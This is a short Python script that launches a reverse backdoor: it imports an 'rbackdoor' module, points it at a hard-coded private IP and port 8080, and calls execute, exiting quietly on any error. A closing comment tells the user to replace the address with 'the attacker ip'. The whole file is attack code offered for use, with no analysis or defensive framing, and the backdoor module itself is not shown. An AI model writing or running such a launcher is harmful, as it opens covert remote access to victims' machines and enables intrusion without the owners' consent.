#!/usr/bin/python3
import rbackdoor
import sys

try:
    my_Rbackdoor= rbackdoor.Rbackdoor("192.168.80.150", 8080)
    my_Rbackdoor.execute()
except Exception:
    sys.exit()

# Replace the ip (192.168.80.150) with the attacker ip and assign the port number you like.
